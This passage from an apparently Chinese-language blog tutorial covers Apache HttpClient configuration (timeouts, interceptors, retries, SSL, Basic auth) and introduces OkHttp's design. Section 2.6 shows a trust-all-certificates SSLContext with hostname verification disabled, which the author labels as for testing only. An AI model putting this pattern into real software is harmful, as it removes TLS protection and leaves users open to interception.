class="line"></span><br><span class="line"><span class="comment">// 之后所有由 timeoutClient 发出的请求都会默认使用此超时配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以为单个请求覆盖默认配置</span></span><br><span class="line"><span class="type">HttpGet</span> <span class="variable">httpGetWithCustomTimeout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;https://some-slow-service.com&quot;</span>);</span><br><span class="line"><span class="type">RequestConfig</span> <span class="variable">customConfig</span> <span class="operator">=</span> RequestConfig.copy(requestConfig)</span><br><span class="line">        .setSocketTimeout(<span class="number">30000</span>) <span class="comment">// 为这个慢服务设置30秒的读取超时</span></span><br><span class="line">        .build();</span><br><span class="line">httpGetWithCustomTimeout.setConfig(customConfig);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-4-拦截器机制"><a href="#2-4-拦截器机制" class="headerlink" title="2.4 拦截器机制"></a>2.4 拦截器机制</h3><p>拦截器是实现日志、统一加签、通用Header等AOP功能的利器。</p>
<ul>
<li><code>HttpRequestInterceptor</code>: 在请求发送前执行。</li>
<li><code>HttpResponseInterceptor</code>: 在收到响应后、返回给调用方前执行。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.http.protocol.HttpContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：添加一个日志拦截器和一个统一的User-Agent头</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">interceptorClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">    .addInterceptorFirst((HttpRequestInterceptor) (request, context) -&gt; &#123;</span><br><span class="line">        <span class="comment">// 在请求最开始处添加Header</span></span><br><span class="line">        request.addHeader(<span class="string">&quot;X-Request-ID&quot;</span>, java.util.UUID.randomUUID().toString());</span><br><span class="line">    &#125;)</span><br><span class="line">    .addInterceptorLast((HttpRequestInterceptor) (request, context) -&gt; &#123;</span><br><span class="line">        <span class="comment">// 在请求发送前记录日志</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Outgoing Request: &quot;</span> + request.getRequestLine());</span><br><span class="line">    &#125;)</span><br><span class="line">    .addInterceptorLast((HttpResponseInterceptor) (response, context) -&gt; &#123;</span><br><span class="line">        <span class="comment">// 在收到响应后记录状态</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Incoming Response Status: &quot;</span> + response.getStatusLine().getStatusCode());</span><br><span class="line">    &#125;)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-5-异常处理与重试"><a href="#2-5-异常处理与重试" class="headerlink" title="2.5 异常处理与重试"></a>2.5 异常处理与重试</h3><p>HttpClient可以自动重试因I&#x2F;O异常（如网络抖动）而失败的请求。<strong>注意：默认只重试幂等的请求（GET, HEAD, PUT, DELETE, OPTIONS, TRACE）。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建重试处理器</span></span><br><span class="line"><span class="comment">// DefaultHttpRequestRetryHandler(int retryCount, boolean requestSentRetryEnabled)</span></span><br><span class="line"><span class="comment">// retryCount: 重试次数</span></span><br><span class="line"><span class="comment">// requestSentRetryEnabled: 请求已发送到服务器后，如果发生I/O异常是否重试。</span></span><br><span class="line"><span class="comment">// 设置为true可能导致非幂等请求（如POST）被执行多次，需谨慎。</span></span><br><span class="line"><span class="type">HttpRequestRetryHandler</span> <span class="variable">retryHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultHttpRequestRetryHandler</span>(<span class="number">3</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以自定义重试逻辑</span></span><br><span class="line"><span class="type">HttpRequestRetryHandler</span> <span class="variable">customRetryHandler</span> <span class="operator">=</span> (exception, executionCount, context) -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (executionCount &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// 重试超过3次，则不再重试</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> java.net.NoRouteToHostException) &#123;</span><br><span class="line">        <span class="comment">// 特定异常不重试</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...其他逻辑</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将重试处理器配置到HttpClient</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">retryClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">        .setRetryHandler(customRetryHandler)</span><br><span class="line">        .build();</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-6-HTTPS与SSL"><a href="#2-6-HTTPS与SSL" class="headerlink" title="2.6 HTTPS与SSL"></a>2.6 HTTPS与SSL</h3><p>处理HTTPS是常见需求，尤其是当需要信任自签名证书或进行客户端证书认证时。</p>
<p><strong>场景：信任所有（或自签名）证书（常用于测试环境）</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 警告：以下代码信任任何证书，会绕过HTTPS的安全检查，绝不能用于生产环境！</span></span><br><span class="line"><span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContexts.custom()</span><br><span class="line">        <span class="comment">// .loadTrustMaterial(trustStore, new TrustSelfSignedStrategy()) // 或加载自定义的信任库</span></span><br><span class="line">        .loadTrustMaterial(<span class="literal">null</span>, (chain, authType) -&gt; <span class="literal">true</span>) <span class="comment">// 信任所有证书</span></span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="type">SSLConnectionSocketFactory</span> <span class="variable">sslsf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SSLConnectionSocketFactory</span>(</span><br><span class="line">        sslContext,</span><br><span class="line">        SSLConnectionSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER); <span class="comment">// 允许所有主机名</span></span><br><span class="line"></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">httpsClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">        .setSSLSocketFactory(sslsf)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用httpsClient访问自签名证书的https站点</span></span><br><span class="line">httpsClient.execute(<span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;https://self-signed.badssl.com/&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><strong>场景：双向认证（客户端需要提供证书）</strong></p>
<p>需要加载客户端的私钥和证书（通常是.p12或.jks文件）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// KeyStore keyStore = ...; // 从.p12文件加载</span></span><br><span class="line"><span class="comment">// String keyPassword = &quot;your_password&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SSLContext sslContextWithKey = SSLContexts.custom()</span></span><br><span class="line"><span class="comment">//         .loadKeyMaterial(keyStore, keyPassword.toCharArray())</span></span><br><span class="line"><span class="comment">//         .loadTrustMaterial(...) // 同时加载信任的服务器证书</span></span><br><span class="line"><span class="comment">//         .build();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ... 后续步骤与上面类似</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-7-认证与凭证管理"><a href="#2-7-认证与凭证管理" class="headerlink" title="2.7 认证与凭证管理"></a>2.7 认证与凭证管理</h3><p>HttpClient内置了对多种HTTP认证方案的支持。</p>
<p><strong>场景：Basic认证</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建凭证提供者</span></span><br><span class="line"><span class="type">CredentialsProvider</span> <span class="variable">credsProvider</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicCredentialsProvider</span>();</span><br><span class="line">credsProvider.setCredentials(</span><br><span class="line">        <span class="comment">// AuthScope限定了凭证生效的范围（主机、端口、领域）</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AuthScope</span>(<span class="string">&quot;httpbin.org&quot;</span>, <span class="number">80</span>), </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">UsernamePasswordCredentials</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;passwd&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将凭证提供者配置到HttpClient</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">authClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">        .setDefaultCredentialsProvider(credsProvider)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 发起请求，HttpClient会在收到401挑战时自动发送凭证</span></span><br><span class="line"><span class="type">HttpGet</span> <span class="variable">httpGetAuth</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;http://httpbin.org/basic-auth/user/passwd&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> authClient.execute(httpGetAuth)) &#123;</span><br><span class="line">    System.out.println(response.getStatusLine()); <span class="comment">// 应该是 200 OK</span></span><br><span class="line">    System.out.println(EntityUtils.toString(response.getEntity()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明:</strong></p>
<ul>
<li>这种方式是<strong>Challenge-Response</strong>模型，即先发请求，服务器返回401，客户端再带上<code>Authorization</code>头重发。</li>
<li>如果想<strong>抢先认证（Preemptive Authentication）</strong>，避免一次额外的往返，可以手动添加<code>Authorization</code>头，或者使用拦截器实现。</li>
</ul>
<p><strong>综合示例：构建一个生产级的HttpClient</strong></p>
<p>最后，我们将以上所有配置组合起来，构建一个适合生产环境使用的 <code>HttpClient</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建连接池</span></span><br><span class="line"><span class="type">PoolingHttpClientConnectionManager</span> <span class="variable">cm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolingHttpClientConnectionManager</span>();</span><br><span class="line">cm.setMaxTotal(<span class="number">200</span>);</span><br><span class="line">cm.setDefaultMaxPerRoute(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建默认请求配置</span></span><br><span class="line"><span class="type">RequestConfig</span> <span class="variable">requestConfig</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">        .setConnectTimeout(<span class="number">5000</span>)</span><br><span class="line">        .setSocketTimeout(<span class="number">10000</span>)</span><br><span class="line">        .setConnectionRequestTimeout(<span class="number">1000</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. (可选) 配置SSL上下文</span></span><br><span class="line"><span class="comment">// SSLContext sslContext = ...;</span></span><br><span class="line"><span class="comment">// SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(sslContext);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 创建HttpClient实例</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">productionClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">        .setConnectionManager(cm)</span><br><span class="line">        .setDefaultRequestConfig(requestConfig)</span><br><span class="line">        .setRetryHandler(<span class="keyword">new</span> <span class="title class_">DefaultHttpRequestRetryHandler</span>(<span class="number">2</span>, <span class="literal">true</span>))</span><br><span class="line">        <span class="comment">// .setSSLSocketFactory(sslsf) // 如果需要自定义SSL</span></span><br><span class="line">        .addInterceptorLast((HttpRequestInterceptor) (request, context) -&gt; &#123;</span><br><span class="line">            request.addHeader(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;MyAwesomeJavaApp/1.0&quot;</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个 productionClient 实例应该是单例的，在整个应用生命周期内复用</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-优缺点分析"><a href="#3-优缺点分析" class="headerlink" title="3. 优缺点分析"></a>3. 优缺点分析</h2><h3 id="3-1-优点"><a href="#3-1-优点" class="headerlink" title="3.1 优点"></a>3.1 优点</h3><p>HttpClient 最大的优势在于其无与伦比的灵活性和对复杂企业级场景的强大支持。它更像一个提供了所有底层零件的“工具箱”，而不是一个开箱即用的“成品”。</p>
<ul>
<li><strong>功能全面 (Comprehensive Features)</strong><ul>
<li><strong>强大的认证支持</strong>: 除了常见的 Basic&#x2F;Digest 认证，它还内置了对 NTLM 和 Kerberos (SPNEGO) 的支持。这在与 Windows 企业环境（如 SharePoint, Exchange Server）集成时至关重要，是许多其他客户端难以比拟的。</li>
<li><strong>精细的连接管理</strong>: <code>PoolingHttpClientConnectionManager</code> 提供了对连接池生命周期的完全控制，包括连接的验证（Stale Connection Check）、空闲连接的回收策略、复杂的路由规则等。</li>
<li><strong>复杂的代理配置</strong>: 支持多级代理、需要认证的代理以及自定义的代理选择策略。</li>
<li><strong>Cookie 管理</strong>: 提供了多种 Cookie 策略（如 <code>RFC_6265</code>, <code>NETSCAPE</code>），并允许实现自定义的 <code>CookieStore</code>。</li>
<li><strong>灵活的重定向策略</strong>: 可以自定义重定向的处理逻辑，例如限制重定向次数、修改重定向后的请求等。</li>
</ul>
</li>
<li><strong>稳定成熟 (Stable and Mature)</strong><ul>
<li><strong>久经考验</strong>: HttpClient 作为一个拥有近20年历史的项目，已经在无数大规模、高并发的生产环境中被反复验证。其稳定性和可靠性得到了业界的广泛认可。</li>
<li><strong>可预测的行为</strong>: 版本的迭代非常谨慎，API 行为稳定，升级过程中的“意外”较少。</li>
<li><strong>庞大的社区</strong>: 拥有庞大的用户基础和丰富的社区资源。当遇到问题时，很容易在 Stack Overflow 或官方邮件列表中找到解决方案。</li>
</ul>
</li>
<li><strong>高度可配 (Highly Configurable)</strong><ul>
<li><strong>万物皆可换</strong>: HttpClient 的设计哲学是“一切皆可替换”。从连接管理器、重试处理器、重定向策略到SSL套接字工厂，几乎每一个环节都提供了接口，允许开发者插入自己的实现来满足特定的、甚至是奇异的需求。</li>
<li><strong>适用特殊场景</strong>: 当你需要解决一些非标准的HTTP交互问题时（例如，与一个行为怪异的旧系统对接），HttpClient 的高度可配置性往往能让你找到解决方案，而更“自以为是”（opinionated）的客户端可能无法做到。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-2-缺点"><a href="#3-2-缺点" class="headerlink" title="3.2 缺点"></a>3.2 缺点</h3><p>HttpClient 的强大灵活性也带来了其最主要的缺点：易用性不足和学习曲线陡峭。</p>
<ul>
<li><strong>API相对繁琐 (Cumbersome API)</strong><ul>
<li><strong>样板代码多</strong>: 如前文示例所示，完成一个简单的请求需要创建多个对象（<code>HttpGet</code>, <code>StringEntity</code>, <code>RequestConfig</code> 等），代码显得冗长。相比之下，OkHttp 或 WebClient 的链式API更加简洁、直观。</li>
<li><strong>资源管理心智负担重</strong>: 开发者必须时刻牢记手动管理响应资源。忘记关闭 <code>CloseableHttpResponse</code> 或消费 <code>HttpEntity</code> 是导致连接池连接泄漏的常见原因，也是新手极易犯的错误。虽然 <code>try-with-resources</code> 语法有所缓解，但其API本身并没有从设计上根本性地解决这个问题。</li>
<li><strong>配置复杂</strong>: 对于新手而言，要正确配置一个生产级的 <code>HttpClient</code>（连接池、超时、重试、SSL）需要理解大量的概念和类，门槛相对较高。</li>
</ul>
</li>
<li><strong>设计略显陈旧 (Slightly Dated Design)</strong><ul>
<li><strong>同步阻塞为核心</strong>: HttpClient 的核心API是同步阻塞式的。虽然它有对应的异步模块 (<code>HttpAsyncClient</code>)，但其异步模型基于回调（<code>FutureCallback</code>），与现代Java中流行的 <code>CompletableFuture</code> (JDK 8+) 或响应式流 (Reactive Streams) 相比，显得格格不入，组合和使用起来都不够方便。</li>
<li><strong>非流畅的默认API</strong>: 其核心对象（如 <code>HttpGet</code>）是可变的，并且配置是通过一系列的 <code>setXXX</code> 方法完成的，不符合现代库所推崇的不可变对象（Immutable Object）和流畅构建者模式（Fluent Builder）的最佳实践。虽然 <code>HttpClientBuilder</code> 和 <code>RequestConfig.Builder</code> 弥补了部分问题，但其整体设计风格依然带有历史的印记。</li>
<li><strong>对HTTP&#x2F;2的支持</strong>: 虽然 HttpClient 5.x 版本开始正式支持 HTTP&#x2F;2，但相比于从设计之初就将 HTTP&#x2F;2 作为核心考量的 OkHttp，其集成和使用体验可能不那么“原生”和透明。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="三、OkHttp"><a href="#三、OkHttp" class="headerlink" title="三、OkHttp"></a>三、OkHttp</h1><p>OkHttp是由Square公司开源的一款现代化、高效的HTTP客户端。它凭借其简洁的API、卓越的性能和强大的拦截器机制，迅速成为Android开发和许多新后端项目的首选。</p>
<h2 id="1-核心概念与设计思想"><a href="#1-核心概念与设计思想" class="headerlink" title="1. 核心概念与设计思想"></a>1. 核心概念与设计思想</h2><h3 id="1-1-OkHttpClient"><a href="#1-1-OkHttpClient" class="headerlink" title="1.1 OkHttpClient"></a>1.1 <code>OkHttpClient</code></h3><p><code>OkHttpClient</code>是所有HTTP请求的发起者和配置中心。它的设计理念与Apache HttpClient的<code>HttpClient</code>有根本不同。</p>
<ul>
<li><strong>职责</strong>:<ul>
<li>作为创建<code>Call</code>对象的工厂。</li>
<li>集中配置所有请求共享的策略，如连接池、超时、代理、SSL、认证、拦截器等。</li>
</ul>
</li>
<li><strong>核心特性</strong>:<ul>
<li><strong>不可变性 (Immutability)</strong>: 一旦通过<code>OkHttpClient.Builder</code>创建出<code>OkHttpClient</code>实例，其内部配置就是不可变的。如果需要一个具有不同配置的客户端，你必须通过<code>.newBuilder()</code>方法创建一个新的构建器来修改并生成新实例。</li>
<li><strong>线程安全 (Thread-Safe)</strong>: 不可变性天生带来了线程安全。你可以在应用的任何地方、任何线程中安全地共享同一个<code>OkHttpClient</code>实例，无需任何额外的同步措施。</li>
<li><strong>鼓励共享与单例 (Designed for Sharing)</strong>: <strong>这是使用OkHttp最重要的最佳实践</strong>。<code>OkHttpClient</code>内部持有并管理着<strong>连接池 (ConnectionPool)</strong> 和<strong>线程池 (Dispatcher)</strong>。每次创建新的<code>OkHttpClient</code>实例都会创建新的连接池和线程池，这是巨大的资源浪费。因此，在整个应用程序中，<strong>应当只维护一个<code>OkHttpClient</code>的单例实例</strong>，并复用它来发起所有HTTP请求。</li>
</ul>
</li>
</ul>
<p><strong>示例：创建和配置OkHttpClient</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建一个Builder</span></span><br><span class="line">OkHttpClient.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 通过Builder配置客户端</span></span><br><span class="line">builder.connectTimeout(<span class="number">10</span>, TimeUnit.SECONDS); <span class="comment">// 10秒连接超时</span></span><br><span class="line">builder.readTimeout(<span class="number">30</span>, TimeUnit.SECONDS);    <span class="comment">// 30秒读取超时</span></span><br><span class="line">builder.writeTimeout(<span class="number">15</span>, TimeUnit.SECONDS);   <span class="comment">// 15秒写入超时</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 构建不可变的OkHttpClient实例</span></span><br><span class="line"><span class="comment">// 在实际项目中，这个client实例应该被配置为Spring Bean或静态单例</span></span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> builder.build();</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="1-2-Request-Response"><a href="#1-2-Request-Response" class="headerlink" title="1.2 Request &#x2F; Response"></a>1.2 <code>Request</code> &#x2F; <code>Response</code></h3><p>OkHttp的数据模型同样遵循不可变原则，API设计极为简洁。</p>
<ul>
<li><strong><code>Request</code></strong>: 代表一个HTTP请求，同样是不可变的。<ul>
<li><strong>构建</strong>: 必须通过<code>Request.Builder</code>以流式API的方式创建。</li>
<li><strong>组成</strong>: 包含了URL、请求方法（通过<code>.get()</code>, <code>.post(body)</code>等方法指定）、请求头和请求体(<code>RequestBody</code>)。</li>
<li><code>RequestBody</code>: 负责定义请求体的内容和MIME类型，有<code>FormBody</code>, <code>MultipartBody</code>等多种实现。</li>
</ul>
</li>
<li><strong><code>Response</code></strong>: 代表一个HTTP响应，也是不可变的。<ul>
<li><strong>组成</strong>: 包含了状态码、状态消息、响应头和响应体(<code>ResponseBody</code>)。</li>
<li><code>ResponseBody</code>: <strong>这是资源管理的关键</strong>。它持有着到底层Socket的连接。<code>ResponseBody</code>像一个一次性的流，其内容只能被读取一次。<strong>读取完毕后，必须调用<code>.close()</code>方法来关闭它</strong>，这样才能将底层连接释放回连接池。最佳实践是使用<code>try-with-resources</code>语句来自动管理<code>Response</code>的生命周期。</li>
</ul>
</li>
</ul>
<p>*<em>示例：<code>try-with-resources</code>确保资源释放</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的使用姿势</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (response.isSuccessful()) &#123;</span><br><span class="line">        <span class="comment">// response.body().string() 会读取并关闭流</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当try代码块结束时，response会自动被close()，即使发生异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="1-3-Call-请求的执行单元"><a href="#1-3-Call-请求的执行单元" class="headerlink" title="1.3 Call: 请求的执行单元"></a>1.3 <code>Call</code>: 请求的执行单元</h3><p><code>Call</code>接口代表一个已经准备好、可以被执行的请求。它像一座桥梁，连接了<code>OkHttpClient</code>和<code>Request</code>。</p>
<ul>
<li><strong>职责</strong>:<ul>
<li>封装了一个完整的请求生命周期，从发送到接收响应。</li>
<li>提供了两种执行方式：同步和异步。</li>
</ul>
</li>
<li><strong>创建</strong>: 通过<code>client.newCall(request)</code>方法创建。</li>
<li><strong>核心方法</strong>:<ul>
<li><code>execute()</code>: <strong>同步执行</strong>。该方法会阻塞当前线程，直到收到响应或发生错误。它会直接返回一个<code>Response</code>对象或抛出<code>IOException</code>。适用于简单的脚本或后台任务。</li>
<li><code>enqueue(Callback callback)</code>: <strong>异步执行</strong>。该方法会立即返回，不会阻塞当前线程。请求会被放入<code>OkHttpClient</code>内部的<code>Dispatcher</code>的任务队列中，由后台线程池执行。当请求完成时，结果会通过<code>Callback</code>接口的<code>onResponse(Call call, Response response)</code>或<code>onFailure(Call call, IOException e)</code>方法在回调线程中返回。这是构建高并发服务和响应式UI的首选。</li>
</ul>
</li>
<li><strong>生命周期</strong>: <code>Call</code>是一个一次性的对象，执行一次后就不能再用。可以通过<code>call.cancel()</code>来尝试取消一个正在执行或等待执行的请求。</li>
</ul>
<hr>
<h3 id="1-4-Interceptors"><a href="#1-4-Interceptors" class="headerlink" title="1.4 Interceptors"></a>1.4 <code>Interceptors</code></h3><p>拦截器是OkHttp最强大、最灵活的设计，它完美地诠释了<strong>责任链模式 (Chain of Responsibility Pattern)</strong>。</p>
<ul>
<li><strong>设计思想</strong>:<ul>
<li>一个HTTP请求的完整过程被看作一个链条，链条由多个拦截器串联而成。</li>
<li>每个拦截器都是一个独立的环节，它可以：<ol>
<li>检查和修改即将发出的<code>Request</code>。</li>
<li>调用<code>chain.proceed(request)</code>将请求传递给链条中的下一个拦截器。</li>
<li>检查和修改从下一个拦截器返回的<code>Response</code>。</li>
<li>甚至可以不调用<code>chain.proceed()</code>，直接返回一个缓存的或伪造的<code>Response</code>，从而短路整个调用链。</li>
</ol>
</li>
</ul>
</li>
<li><strong>拦截器链的组成</strong>:<br><code>[应用代码] -&gt; [应用拦截器] -&gt; [OkHttp核心代码] -&gt; [网络拦截器] -&gt; [网络]</code></li>
<li><strong>两种拦截器</strong>:<ol>
<li><strong>应用拦截器 (Application Interceptors)</strong>:<ul>
<li>通过<code>.addInterceptor(interceptor)</code>添加。</li>
<li><strong>特点</strong>:<ul>
<li>位于拦截器链的最顶端，最先接触到用户的原始<code>Request</code>。</li>
<li><strong>只会被调用一次</strong>，即使请求因为重定向或重试而发生多次网络交互。</li>
<li>不关心重定向和重试等中间过程。</li>
</ul>
</li>
<li><strong>适用场景</strong>: 记录最原始的请求日志、为所有请求添加不应随重定向改变的通用Header（如<code>User-Agent</code>, <code>Authorization</code>）。</li>
</ul>
</li>
<li><strong>网络拦截器 (Network Interceptors)</strong>:<ul>
<li>通过<code>.addNetworkInterceptor(interceptor)</code>添加。</li>
<li><strong>特点</strong>:<ul>
<li>位于OkHttp核心逻辑与实际网络I&#x2F;O之间。</li>
<li><strong>对于每一次网络尝试都会被调用</strong>。如果一个请求发生了重定向，网络拦截器会被调用两次（一次为原始请求，一次为重定向后的请求）。</li>
<li>能够观察到由OkHttp添加的、用于网络通信的真实请求头（如<code>Host</code>, <code>Connection</code>, <code>Content-Length</code>等）。</li>
</ul>
</li>
<li><strong>适用场景</strong>: 监控网络流量（如Gzip压缩前后的大小）、处理网络层面的重试、详细调试每一次网络交互。</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<h2 id="2-核心功能与代码实践-1"><a href="#2-核心功能与代码实践-1" class="headerlink" title="2. 核心功能与代码实践"></a>2. 核心功能与代码实践</h2><p><strong>（前置代码：创建单例OkHttpClient）</strong><br>所有示例都将基于一个共享的<code>OkHttpClient</code>实例。在真实项目中，它应该通过依赖注入（如Spring的<code>@Bean</code>）或静态初始化的方式成为单例。</p>
